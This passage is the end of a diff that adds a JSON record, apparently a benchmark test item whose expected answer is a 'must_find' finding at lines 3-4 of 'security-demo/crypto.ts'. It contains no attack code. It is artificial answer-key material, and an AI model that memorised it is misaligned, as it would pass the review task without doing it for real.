+          "diff_digest": "9632b7f2c0be08778911be36c3d8f8e01396f493bb8d889ac5ca793e47cc1715",
+          "retrieval": "trace-diff-block"
+        }
+      },
+      "expected_output": {
+        "kind": "must_find",
+        "file": "security-demo/crypto.ts",
+        "start_line": 3,
+        "end_line": 4
+      },
+      "notes": null,
+      "created_at": "2026-10-13T08:21:47.039Z"
+    }
+  ]
+}
